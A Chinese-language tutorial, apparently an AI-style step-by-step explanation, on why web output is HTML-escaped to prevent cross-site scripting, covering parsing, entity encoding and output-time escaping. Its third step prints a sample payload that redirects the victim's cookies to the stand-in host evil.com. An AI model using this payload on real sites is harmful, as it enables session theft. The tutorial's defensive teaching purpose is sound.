    # 為什麼網頁要對輸出做 HTML 跳脫來防止 XSS
    
    讓我逐步推理，從根本原因講到解決方案。
    
    ## 第一步：瀏覽器如何看待 HTML？
    
    瀏覽器拿到一段文字時，並不會把它當成「純文字」顯示，而是把它**解析（parse）成 HTML**。它會尋找特殊字元來判斷結構：
    
    - `<` 代表「一個標籤開始了」
    - `>` 代表「標籤結束」
    - `"` `'` 代表屬性值的邊界
    - `&` 代表 HTML 實體（entity）的開始
    
    **關鍵認知：這些字元對瀏覽器來說是「指令」，不是「內容」。**
    
    ## 第二步：資料與程式碼被混在同一個通道
    
    網頁的本質問題是——**HTML 文件裡同時裝著「程式碼（標籤、腳本）」和「資料（文字內容）」，而且用同一串字元流傳輸。**
    
    當伺服器把使用者輸入的資料「直接拼接」進 HTML：
    
    ```html
    <div>你好，<?= $username ?></div>
    ```
    
    瀏覽器無法知道這段 `$username` 是「我要顯示的文字」還是「我要執行的指令」。它只會照字元本身的意義去解析。
    
    ## 第三步：攻擊者如何利用這一點（XSS 的成因）
    
    假設使用者把名字填成：
    
    ```
    <script>document.location='https://evil.com?c='+document.cookie</script>
    ```
    
    伺服器若原樣拼進去，瀏覽器收到的是：
    
    ```html
    <div>你好，<script>...偷 cookie...</script></div>
    ```
    
    瀏覽器看到真正的 `<script>` 標籤 → **判定這是程式碼 → 執行它**。
    
    這就是 XSS（跨站腳本）：攻擊者的資料被瀏覽器當成了程式碼，於是能竊取 cookie、偽造操作、植入釣魚內容——而且是在「受信任網站」的身分下執行。
    
    ## 第四步：問題的核心是「字元的意義被誤解」
    
    既然瀏覽器是靠 `<` `>` `&` `"` 這些字元來判斷結構，那麼**只要資料裡出現這些字元，就有可能被誤解為結構。**
    
    所以解法不是「過濾掉壞字串」（黑名單永遠會漏），而是——
    
    > **明確告訴瀏覽器：「這些字元是要顯示的文字，不是指令。」**
    
    ## 第五步：HTML 跳脫（escaping）就是做這件事
    
    HTML 提供了「實體編碼」機制，用來表示「我指的是這個字元本身，不是它的語法意義」：
    
    | 原字元 | 跳脫後 | 意義 |
    |--------|--------|------|
    | `<` | `&lt;` | 顯示一個小於號 |
    | `>` | `&gt;` | 顯示一個大於號 |
    | `&` | `&amp;` | 顯示一個 & 符號 |
    | `"` | `&quot;` | 顯示一個雙引號 |
    | `'` | `&#39;` | 顯示一個單引號 |
    
    跳脫後，剛才的攻擊字串變成：
    
    ```html
    <div>你好，&lt;script&gt;...&lt;/script&gt;</div>
    ```
    
    瀏覽器解析 `&lt;` → 「這是要顯示的 `<` 字元」→ **不會建立 `<script>` 標籤 → 只會在畫面上原樣顯示文字 `<script>...`**。攻擊腳本永遠不會被當成程式碼執行。
    
    ## 第六步：為什麼要在「輸出時」做，而不是「輸入時」？
    
    這是最常被誤解的一點：
    
    1. **跳脫方式取決於輸出的「上下文」**。同一份資料，放進 HTML 內文、HTML 屬性、JavaScript 字串、URL 參數，需要的跳脫規則**完全不同**。只有在輸出那一刻，你才知道該用哪種。
    2. **原始資料應該保持乾淨**。使用者的名字裡若真有 `<`，你應該原樣存進資料庫，只在「送進 HTML 時」才編碼。若在輸入時就改掉，資料會失真，也可能被二次編碼或在其他場合（如寄 email）出錯。
    
    所以正確原則是：**存原始資料，在輸出到特定上下文的那一刻才做對應的跳脫。**
    
    ## 總結：完整的因果鏈
    
    1. 瀏覽器用特殊字元（`< > & " '`）來判斷 HTML 的結構與指令。
    2. 網頁把「資料」和「程式碼」混在同一個字元流裡。
    3. 若使用者資料含有這些特殊字元且被原樣輸出，瀏覽器會把資料誤當成指令 → 執行攻擊者的腳本（XSS）。
    4. HTML 跳脫把這些字元轉成實體編碼，明確宣告「這是文字，不是語法」。
    5. 於是資料與程式碼的界線被重新畫清，攻擊腳本只會被「顯示」而不會被「執行」，XSS 被阻斷。
    
    **一句話：HTML 跳脫的本質，是在資料與程式碼共用同一通道的世界裡，為「資料」重新加上一道明確的邊界，讓瀏覽器不再把使用者輸入誤解成指令。**
    
    ---
    
    補充：跳脫是**防禦 XSS 的基礎手段**，但要完整防護，通常還會搭配 Content-Security-Policy（CSP）、對不同上下文使用對應的編碼函式、以及對富文本使用專門的 HTML 淨化器（如 DOMPurify）。
